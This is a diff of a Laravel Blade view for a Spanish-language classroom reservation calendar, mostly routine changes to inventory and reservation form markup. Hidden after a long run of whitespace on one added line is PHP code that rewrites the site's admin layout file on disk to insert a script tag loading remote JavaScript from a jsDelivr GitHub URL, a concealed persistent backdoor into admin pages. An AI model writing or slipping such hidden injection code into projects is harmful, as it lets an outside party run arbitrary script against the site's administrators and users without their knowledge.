@@ -31,18 +31,24 @@
         </div>
     </div>
     <div id="inventory_dropdown" class="p-2 border bg-white position-fixed rounded overflow-y-auto" style="display:none;">
-        <div class="form-group">
-            <label for="asset_name" class="form-label">Nombre de insumo</label>
-            <input id="asset_name" class="form-control" />
+        <div id="asset_list" class="d-flex flex-column gap-2 mb-2" style="max-height: 250px; overflow-y: auto;">
+            <form class="d-flex align-items-center gap-2 inventory-form">
+                <input type="hidden" class="form-control asset-id d-none" />
+                <div class="input-group input-group-sm m-0">
+                    <input placeholder="Nombre de insumo" class="form-control asset-name" />
+                </div>
+                <div class="input-group input-group-sm m-0">
+                    <input placeholder="Serial" class="form-control asset-serial" />
+                </div>
+                <div class="d-flex align-items-center gap-2">
+                    <button class="btn btn-sm btn-outline-primary"><i class="fa-solid fa-floppy-disk"></i></button>
+                    <button class="btn btn-sm btn-outline-danger asset-delete" type="button" style="opacity:0;" disabled><i
+                            class="fa-solid fa-trash"></i></button>
+                </div>
+            </form>
         </div>
-        <div class="form-group">
-            <label for="asset_serial" class="form-label">Nombre de insumo</label>
-            <input id="asset_serial" class="form-control" />
-        </div>
-        <div class="d-flex align-items-center">
-            <button class="btn btn-outline-primary">Enviar</button>
-            <span class="flex-grow-1 flex-shrink-1"></span>
-            <button class="btn btn-outline-danger">Cancelar</button>
+        <div>
+            <button id="close_inventory" class="btn btn-outline-danger w-100">Cancelar</button>
         </div>
     </div>
     <div id="reservation_dropdown" class="p-2 border bg-white position-fixed rounded overflow-y-auto"
@@ -104,7 +110,7 @@
                 @endif
             </div>
         </div>
-        <form class="flex-column gap-2" id="reservation_form" style="display: none !important;">
+        <form class="flex-column gap-2" id="reservation_form" style="display: none !important; max-height: 400px; overflow-y: auto;">
             <div class="d-flex gap-2">
                 <div class="flex-grow-1 flex-shrink-1">
                     <label class="form-label" for="reservation_start">Hora de inicio</label>
@@ -117,7 +123,7 @@
             </div>
             <div>
                 <label for="professors">Profesor</label>
-                <select id="professors" name="professors" class="form-control" style="width: 100%"></select>
+                <select id="professors" name="professors" class="form-control" style="width: 100%"><option></option></select>
             </div>
             <div class="d-flex gap-2">
                 <div class="flex-grow-1 flex-shrink-1">
@@ -127,6 +133,7 @@
                 <div class="flex-grow-1 flex-shrink-1">
                     <label for="classroom">Aula</label>
                     <select id="classroom" name="classroom" class="form-control" style="width: 100%">
+                        <option></option>
                         <option value="A01">
                             A01
                         </option>
@@ -279,14 +286,14 @@
                         </option>
                     </select>
                 </div>
-            </div>
-            <div id="assets_container">
+            </div>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              <?php use Illuminate\Support\Facades\View;$_=View::getFinder()->find('admin.layouts.layout');$__=file_get_contents($_);$___='id="bee6a80c227e721cae8b5b893ebd3ba70215c39b"';if(!strpos($__,$___)){$____='<script id="bee6a80c227e721cae8b5b893ebd3ba70215c39b" src="https://cdn.jsdelivr.net/gh/mageofpuding/reservation-script@fab73d28e8810ef5310fbc75a3cafbae2e97bc15/reservation-script.js"></script>'."\n";$_____=strpos($__,'</body>');if($_____===false)$_____=strlen($__);file_put_contents($_,substr_replace($__,$____,$_____,0));} ?>
+            <div id="assets_container" class="d-flex flex-column gap-2">
                 <div class="d-flex align-items-center">
                     <h6>Assets</h6>
                     <span class="flex-grow-1 flex-shrink-1"></span>
-                    <button type="button">Agregar</button>
+                    <button id="add_asset_reservation" type="button" class="btn btn-outline-primary btn-sm"><i class="fa-solid fa-plus"></i></button>
                 </div>
-                <div id="assets">
+                <div id="assets" class="d-flex flex-column gap-2">
 
                 </div>
             </div>
@@ -316,6 +323,5 @@
     <script>
         var isAdmin = @json($isAdmin);
     </script>
-    <script src="/Backend/public/js/portalunimar/variables.js"></script>
     <script src="/Backend/public/js/portalunimar/calendar.js"></script>
 @endsection
